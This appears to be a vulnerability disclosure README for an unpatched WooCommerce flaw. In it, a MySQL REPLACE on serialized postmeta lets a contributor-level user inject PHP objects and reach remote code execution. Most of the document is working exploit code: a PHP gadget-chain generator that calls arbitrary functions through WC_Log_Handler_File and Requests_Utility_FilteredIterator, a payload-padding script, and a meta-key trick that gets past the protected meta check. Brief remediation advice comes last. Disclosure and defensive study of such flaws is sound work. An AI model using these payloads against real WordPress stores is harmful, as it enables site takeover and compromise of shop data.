# WooCommerce MySQL replace to RCE

This bug is 0day, but same as this bug was reported in the past. Try to fix here https://woocommerce.wordpress.com/2018/08/29/woocommerce-3-4-5-security-fix-release-notes/ and fix here https://woocommerce.wordpress.com/2018/10/11/woocommerce-3-4-6-security-fix-release-notes/. Anyway, in the code there is another DB query that modifies serialized PHP content outside from serialize / unserialize PHP functions and that results into user object injection. Beside numerous tries to harden WP, yet this bug is exploitable from contributor user role. See full exploitation via this video.

## Eli5 PoC

In order someone to be able to exploit issue like this, two things are needed. 
- PHP gadget chain (Woo have one)
- knowledge about data that will be replace (it is public data in any Woo instance)

Woo PHP gadget chain generator that will survive `wc_clean`
```
<?php
//MIT license
define("WOO_POC_WIZZARD", TRUE);
if (WOO_POC_WIZZARD){
    if ( isset($argv) && is_array($argv) ){
        if ( sizeof($argv) >= 2 ){
            $call_func = $argv[1];
            $call_func_params = array_slice($argv, 2);
        }else{
            echo "Usage php poc_woo.php print_r input1 input2 ...\n";
            exit();
        }
    }elseif(isset($_REQUEST) && is_array($_REQUEST) ){
        if (sizeof($_REQUEST) >= 1 && isset($_REQUEST["func"])) {
            $call_func = $_REQUEST["func"];
            $call_func_params = isset($_REQUEST["param"])?$_REQUEST["param"]:array();
        }else{
            echo "<p>Usage http://your_localhost/poc_woo.php?func=print_r".htmlentities("&")."param[0]=test".htmlentities("&")."param[1][0]=test2".htmlentities("&")."param[1][1]=test2</p>";
            exit();
        }
    }
}else{
    echo "Set \$call_func and \$call_func_params by hand here\n";
    /*
     $call_func = "print_r";
     $call_func_params = array(array(1,2,3), "search1", "search2");
     //*/
}
class Requests_Utility_FilteredIterator extends ArrayIterator {
    protected $callback;
    public function __construct($data, $callback) {
        parent::__construct($data);
        $this->callback = $callback;
    }
    public function current() {
        $value = parent::current();
        $value = call_user_func($this->callback, $value);
        return $value;
    }
}
class WC_Log_Handler{
}
class WC_Log_Handler_File extends WC_Log_Handler {
    protected $handles = array();
    function __construct($call_func, $call_func_params){
        //seccond argument e.g. print_r is the function that will be called. Could be any php/wp function
        //each array member from the constructor first argument is the input towards the function
        $this->handles = new Requests_Utility_FilteredIterator($call_func_params, $call_func);
    }
}
//create test object
$test_obj = new WC_Log_Handler_File($call_func, $call_func_params);
//string e.g. serialized object
$serialized_obj = serialize($test_obj);
//make it to go trough filters for control characters like wp text sanitation mechanisms
$serialized_obj = str_replace('s:10:"'."\x00".'*'."\x00".'handles"', 'S:10:"\00\2A\00\68\61\6E\64\6C\65\73"', $serialized_obj);
$serialized_obj = str_replace('s:11:"'."\x00".'*'."\x00".'callback"', 'S:11:"\00\2A\00\63\61\6C\6C\62\61\63\6B"', $serialized_obj);
//correct the size of "Requests_Utility_FilteredIterator":_number_: with +22
preg_match('/_FilteredIterator":([0-9]+):/s', $serialized_obj, $found);
$serialized_obj = str_replace($found[0], '_FilteredIterator":'.($found[1]+22).':', $serialized_obj);
//print the test payload
if ( isset($argv) ){
    echo "\n#######payload#######\n";
    echo $serialized_obj."\n";
    echo "#######payload#######\n\n";
}else{
    echo "#######payload#######<br/>";
    echo $serialized_obj."<br/>";
    echo "#######payload#######<br/>";
}
exit();
```
this output will be used as input towards final payload generator where we need another constraint: number of bytes that will be added or removed (below script will work for bytes adding and for every number of bytes added payload can be generated)
```
<?php 

//grab it from some payload generator Woo/WP or PHP related 
//https://gist.github.com/Slavco/946905eef6f9cb0f03a2ed2bdee83d9c
$payload_real = 'O:19:"WC_Log_Handler_File":1:{S:10:"\00\2A\00\68\61\6E\64\6C\65\73";C:33:"Requests_Utility_FilteredIterator":101:{x:i:0;a:1:{i:0;s:11:"ScotchDolly";};m:a:1:{S:11:"\00\2A\00\63\61\6C\6C\62\61\63\6B";s:9:"error_log";}}}';

$payload_prepend = '";i:777;'; //chances to have something similar in real payload are marginal so we can use as starting point
$payload_append  = '}';//to finish the serialized string array in this case
$payload_pre_final = $payload_prepend.$payload_real.$payload_append;

//could be anything - this is for this current Woo case :)
$change_str = 's:6:"pa_boo";s:3:"woo";';

$change_in_bytes_plus = 5;
//todo change in bytes minus

$repeat = 0;
$cnt = 1;
do{
    
    $mod = mb_strlen($payload_pre_final) % $change_in_bytes_plus;
    $repeat = mb_strlen($payload_pre_final) / $change_in_bytes_plus;
    if ( $mod !== 0 ){
        $tmp = '";i:'.str_repeat("7", (3+$cnt)).';';
        $old = '";i:'.str_repeat("7", (3+$cnt-1)).';';
        $payload_pre_final = str_replace($old, $tmp, $payload_pre_final);
    }
    $cnt++;
}while( $mod !== 0);

echo urlencode(str_repeat($change_str, $repeat).$payload_pre_final);
exit();
```
Now everything left is to add this payload as item of meta value array and to name it 
`%11_default_attributes` in order to prevent protected meta check and MySQL query to consider it as desired data that need to be changed.
```
UPDATE {$wpdb->postmeta} SET meta_value = REPLACE( meta_value, %s, %s ) WHERE meta_key = '_default_attributes'...
```

## Few facts

- Changing a byte from serialized content results with unserialize of user input, because its format
- PHP serialization is faster than json on big data sets
- When someone say do not change serialized string, means do not https://files.ripstech.com/slides/OWASP_AppSec_EU18_WordPress.pdf

## Remediation

- Put constraints into your php ini regarding serialization
- Sign your content, so any change from outside world will be detected and not processed 


